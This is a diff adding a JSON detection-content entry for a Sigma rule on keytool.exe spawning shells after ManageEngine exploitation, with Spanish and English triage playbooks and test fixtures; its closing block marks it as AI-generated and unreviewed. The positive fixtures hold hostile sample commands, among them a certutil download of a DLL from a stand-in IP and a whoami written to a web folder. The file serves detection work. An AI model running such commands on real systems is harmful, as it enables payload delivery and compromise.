@@ -1,0 +1,129 @@
+{
+  "rule": {
+    "id": "90fb5e62-ca1f-4e22-b42e-cc521874c938",
+    "title": "Suspicious Shells Spawn by Java Utility Keytool",
+    "level": "high",
+    "status": "test",
+    "author": "Andreas Hunkeler (@Karneades)",
+    "path": "windows/process_creation/proc_creation_win_java_keytool_susp_child_process.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_java_keytool_susp_child_process.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "El proceso keytool.exe de Java inició un shell o un binario LOLBin como cmd, PowerShell, certutil o whoami. Esto suele indicar ejecución de comandos tras explotar una aplicación Java, como ManageEngine ADSelfService Plus.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde ParentImage termina en \\keytool.exe e Image es uno de 24 intérpretes o utilidades de sistema, entre ellos cmd.exe, powershell.exe, pwsh.exe, schtasks.exe, certutil.exe, rundll32.exe, mshta.exe, reg.exe y systeminfo.exe.",
+      "why_it_matters": "keytool solo gestiona certificados y almacenes de claves, así que no tiene motivo para abrir shells. Las referencias de la regla describen la explotación de CVE-2021-40539 en ADSelfService Plus, donde se abusa de keytool para ejecutar código. Corresponde a la explotación de una aplicación expuesta a Internet para obtener acceso inicial, persistencia y escalamiento de privilegios.",
+      "triage_steps": [
+        "Revise Image, CommandLine y el usuario del proceso hijo. Una cuenta SYSTEM o de servicio que ejecute whoami, systeminfo o certutil con URL es muy sospechosa.",
+        "Revise la línea de comandos de keytool.exe y su proceso padre (normalmente java.exe). Identifique qué aplicación es dueña de la ruta del JRE, por ejemplo ManageEngine.",
+        "Busque procesos descendientes del hijo y otros procesos en el mismo host +/- 15 minutos: descargas, tareas programadas, archivos .jsp o .dll nuevos.",
+        "Revise los logs web de la aplicación Java en esa ventana: solicitudes POST anómalas a endpoints REST o de carga de archivos y la IP de origen.",
+        "Busque conexiones salientes del host hacia IP o dominios poco comunes después de la ejecución (certutil, bitsadmin, powershell).",
+        "Compruebe la versión de la aplicación y si tiene los parches de seguridad del proveedor.",
+        "Busque alertas anteriores de este host, de la IP de origen web y del mismo hash de keytool.exe."
+      ],
+      "false_positives": [
+        "La regla indica falsos positivos desconocidos; no se espera que keytool genere shells.",
+        "Un script de instalación o actualización de un producto Java podría invocar keytool desde un wrapper; valide con el administrador y con la ventana de cambio."
+      ],
+      "response_steps": [
+        "Confirme con el dueño de la aplicación si había mantenimiento; si no lo había, trate el caso como compromiso.",
+        "Aísle el host o restrinja su acceso a Internet y conserve la memoria, los logs web y los artefactos antes de hacer cambios.",
+        "Identifique y elimine web shells, tareas programadas, servicios o binarios creados por el atacante, después de documentarlos.",
+        "Rote las credenciales de cuentas de servicio y de dominio usadas o accesibles desde el servidor, en especial las de Active Directory.",
+        "Aplique los parches del proveedor, restaure desde una fuente confiable si hace falta y vigile el host para detectar reincidencias."
+      ],
+      "severity_rationale": "Nivel alto: un shell lanzado por keytool casi nunca es legítimo y suele indicar ejecución remota de código en un servidor expuesto con privilegios elevados."
+    },
+    "en": {
+      "summary": "The Java keytool.exe process launched a shell or LOLBin such as cmd, PowerShell, certutil or whoami. This usually means commands are running after a Java application such as ManageEngine ADSelfService Plus was exploited.",
+      "what_it_detects": "Windows process creation events where ParentImage ends with \\keytool.exe and Image is one of 24 interpreters or system utilities, including cmd.exe, powershell.exe, pwsh.exe, schtasks.exe, certutil.exe, rundll32.exe, mshta.exe, reg.exe and systeminfo.exe.",
+      "why_it_matters": "keytool only manages certificates and keystores, so it has no reason to start shells. The rule's references describe exploitation of CVE-2021-40539 in ADSelfService Plus, where keytool is abused to run code. This is exploitation of a public-facing application to gain initial access, persistence and privilege escalation.",
+      "triage_steps": [
+        "Review the child's Image, CommandLine and user. A SYSTEM or service account running whoami, systeminfo, or certutil with a URL is highly suspicious.",
+        "Review keytool.exe's command line and its parent, usually java.exe. Identify which application owns the JRE path, for example ManageEngine.",
+        "Look for descendants of the child and other processes on the same host +/- 15 minutes: downloads, scheduled tasks, new .jsp or .dll files.",
+        "Check the Java application's web logs in that window for anomalous POSTs to REST or upload endpoints, and note the source IP.",
+        "Look for outbound connections from the host to unusual IPs or domains after the execution (certutil, bitsadmin, powershell).",
+        "Check the application version and whether the vendor's security patches are installed.",
+        "Search for earlier alerts on this host, the web source IP and the same keytool.exe hash."
+      ],
+      "false_positives": [
+        "The rule lists false positives as unknown; keytool is not expected to spawn shells.",
+        "An install or upgrade script for a Java product could call keytool through a wrapper; confirm with the administrator and the change window."
+      ],
+      "response_steps": [
+        "Ask the application owner whether maintenance was underway; if it was not, treat this as a compromise.",
+        "Isolate the host or restrict its internet access, and preserve memory, web logs and artifacts before making changes.",
+        "Document, then remove, any web shells, scheduled tasks, services or binaries the attacker created.",
+        "Rotate credentials for service and domain accounts used by or reachable from the server, especially Active Directory accounts.",
+        "Apply the vendor's patches, rebuild from a trusted source if needed, and monitor the host for recurrence."
+      ],
+      "severity_rationale": "High fits because a shell spawned by keytool is almost never legitimate and usually means remote code execution on an exposed, privileged server."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "keytool.exe from ManageEngine's bundled JRE spawns cmd.exe that runs whoami",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-ADSSP01.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "ParentImage": "C:\\ManageEngine\\ADSelfService Plus\\jre\\bin\\keytool.exe",
+          "ParentCommandLine": "\"C:\\ManageEngine\\ADSelfService Plus\\jre\\bin\\keytool.exe\" -J-Duser.language=en -genkeypair -alias tomcat",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c whoami > C:\\ManageEngine\\ADSelfService Plus\\webapps\\adssp\\help\\out.txt",
+          "IntegrityLevel": "System"
+        }
+      },
+      {
+        "description": "keytool.exe spawns certutil.exe to download a file",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-ADSSP01.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "ParentImage": "C:\\ManageEngine\\ADSelfService Plus\\jre\\bin\\keytool.exe",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.45/update.dll C:\\Windows\\Temp\\update.dll",
+          "IntegrityLevel": "System"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate keytool run started by java.exe: keytool is the Image, not the ParentImage",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP02.andes.example.com",
+          "User": "ANDES\\svc_tomcat",
+          "ParentImage": "C:\\Program Files\\Java\\jdk-17\\bin\\java.exe",
+          "Image": "C:\\Program Files\\Java\\jdk-17\\bin\\keytool.exe",
+          "CommandLine": "keytool.exe -list -keystore C:\\Tomcat\\conf\\keystore.jks",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "keytool.exe spawns conhost.exe, which is not on the rule's list of child images",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Program Files\\Java\\jdk-17\\bin\\keytool.exe",
+          "Image": "C:\\Windows\\System32\\conhost.exe",
+          "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
